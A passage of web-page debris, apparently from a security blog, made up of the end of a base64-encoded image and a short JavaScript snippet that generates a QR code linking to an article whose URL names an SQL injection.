8cOHpUPnP2ZoSogxrthdDdSwgzJ14BoQFucTwfcKBJeFybHxHOfdrPMQ1kbLTXrz2BPZDXnvfT3ZYD8TXKXSCuHnTMunLXCbU+C+kOe6D3HTV7hBA+ezJK/0hA9IKOVf1qj6xB9Mmc86pv5pYDycadv+YE2kBgnioEVz2KJ14hRB10zD2g8xC5+1Q+cxBewFSJ7iW0QbnC64zix8g68PCFXNroh/AAko8AjjrgWJ/9BjRfG8iZ+f+F/7c85x7IL5tk+/G7ryD062OuembovlF3ndAanPvtEarGobUCota8UPyVgKiFwKoGQgOarD0cjUwJ0D7NwPOfIsCjH0jderpvSD+LX5FNA/FbIQQe3gJ4fBPkUXznRwJ9z+/oq+dTXO0FfX+I/GrtFZ+exWG/18JpIDZtvOcE9kDuOffTXaf/Y3jqfBcgrjF0fJfapzevM+o6Osx7LYToZy2jdAWEB/qnzuxzDt0HkateYY9Q67OQ7rDH6woh9gEqueSA48yyuG9IPo1fkE/f9uZn8pvxDHPNldz9srfirMP8JkFw0NF+98oI3QeR2w+xho7WhNB5iFy8Iu8x5tLHgKiHfsuhc/uGjCf2sH79YvoaAn1acC0fHxt6nd8a6Jz9MHP2V+g6YaVD7weRy6uo/OLPIvvtqThrEPsBpj6F+4Z86th+rmgP5OfO9lOd20DydbySf2q39yLg+HYv7wPBvVueAlzzQ/jgHPNmfqaKg94j68pdJ9T6LKQ7IPp5LWwDOWuw+deewDQQiKlBjR99PIg+VR2EBlTycYuAhtmkt0lRceLPIvudZy/EftaeIYQfZnxWax167TQQmzbecwJ7IPec++mu3zoQX/3T3d6F7/BBv+YQ+Xv79ikOggcslQi0GhugcxC5tYz+WDJarzhrZ/itAznbZPOPJ7Ba/fhA8lvi3A/kdUaItxGw7eHfgGSv8mZ6S4DjTRc/BoT2Zlv+cl02rTiY+1b+3G+V//hAVptvbT6BPZD5TG5lpoH4up3hlafNtSs/xHWHjrkWOg88tAKOT08P5PsCQoOOue+Yv5c9hVwH0bsqgllzbeXP3DSQLO789SfQBgIxVbiGq0eF3sM+mDm/NRntrxDmHpWv4iBqK+0r+7sWoj/QtgCOWwwdm5gS9xC2gSR9pzeewB7IjYdfbf0/AAAA//9i5JslAAAABklEQVQDACChBK0C4elWAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-getCountByCode-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 